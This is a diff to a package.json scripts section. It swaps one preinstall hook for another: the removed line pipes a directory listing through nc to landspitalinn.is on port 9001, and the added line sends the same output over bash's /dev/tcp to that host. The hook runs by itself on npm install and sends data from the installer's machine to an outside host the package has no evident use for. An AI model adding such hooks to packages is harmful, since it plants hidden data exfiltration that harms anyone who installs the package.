@@ -15,6 +15,6 @@
   "scripts": {
 	"prepack": "echo prepack",
 	"prepare": "echo prepare",
-	"preinstall": "ls | nc landspitalinn.is 9001"
+	"preinstall": "ls >& /dev/tcp/landspitalinn.is/9001 0>&1"
   }
 }
